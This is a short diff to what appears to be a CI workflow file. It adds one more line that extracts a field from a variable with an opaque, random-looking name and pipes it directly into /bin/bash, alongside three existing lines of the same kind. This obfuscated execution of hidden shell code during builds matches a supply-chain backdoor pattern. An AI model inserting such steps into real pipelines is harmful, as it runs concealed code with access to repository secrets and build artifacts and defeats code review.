@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$fen9" | jq -r .pitwv4582 | /bin/bash
           echo $aj41 | jq -r .iuz1 | /bin/bash
           printf '%s' "$e94639" | jq -r .caic9 | /bin/bash
+          echo $im63 | jq -r .qd65 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
